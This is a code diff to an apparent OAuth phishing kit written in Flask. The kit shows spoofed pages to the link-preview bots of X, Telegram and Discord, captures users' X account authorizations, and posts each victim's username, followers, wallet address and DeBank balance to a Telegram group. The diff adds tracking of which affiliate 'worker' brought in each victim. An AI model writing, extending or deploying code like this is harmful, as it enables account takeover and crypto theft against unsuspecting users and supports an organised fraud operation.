@@ -40,6 +40,11 @@ def oauth():
     )
     if not group:
         return "⚠️ Identifier is invalid.", 404
+
+    matched = next(
+        (i for i in group["identifiers"] if i["identifier"] == identifier),
+        None
+    )
     
     spoof = group["spoof"]
     session["redirect_url"] = group["redirect"]
@@ -48,7 +53,9 @@ def oauth():
     session["client_id"] = client["id"]
     session["client_secret"] = client["secret"]
     
+    session["owner_id"] = group["owner_id"]
     session["group_id"] = group["group"]["id"]
+    session["worker_id"] = matched["user_id"]
     
     if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
         return redirect(spoof)
@@ -170,8 +177,14 @@ def auth_callback():
 
         balance = formatter(data["total_usd_value"])
 
+        owner_id = session["owner_id"]
+        worker_id = session["worker_id"]
+
+        worker_line = f"👷 *Worker*: [{worker_id}](tg://user?id={worker_id})"
+
         message = (f'🐍 *User [{username}](https://x.com/{username}) has authorized.*\n'
                    f'👥 *Followers:* {followers}\n\n'
+                   f'{worker_line if owner_id != worker_id else ""}'
                    f'🔗 *[{address}](https://debank.com/profile/{address})* | $*__{balance}__*')
 
         send_message(group_id, message)
